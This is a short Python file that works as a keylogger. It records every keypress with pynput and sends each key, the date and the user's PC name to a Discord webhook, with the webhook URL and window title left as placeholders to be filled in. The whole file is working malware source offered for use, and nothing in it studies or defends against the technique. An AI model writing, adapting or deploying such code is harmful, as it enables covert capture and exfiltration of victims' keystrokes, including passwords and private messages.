from pynput.keyboard import Key, Listener
import logging, json
import os
from datetime import date
import datetime
import time 
from discord_webhook import DiscordWebhook, DiscordEmbed
import re
from urllib.request import Request, urlopen
import socket 
import json
from datetime import datetime
import requests


pcname = os.getenv('username')
key_logger = True
today = date.today()
ext = {"webhook-id": "WEBHOOK-URL", "webhook-name": "WEBHOOK-NAME"}
os.system('title TITLE OF THE APP')


def on_press(key):
    webhook = DiscordWebhook(url=ext['webhook-id'], content=f"| Date: {today} | KEY: **{str(key)}** | PC name: {pcname} |",  username=ext['webhook-name'])
    response = webhook.execute()


def listener_s():
    with Listener(on_press=on_press) as listener:
        listener.join()

if key_logger is True:
    listener_s()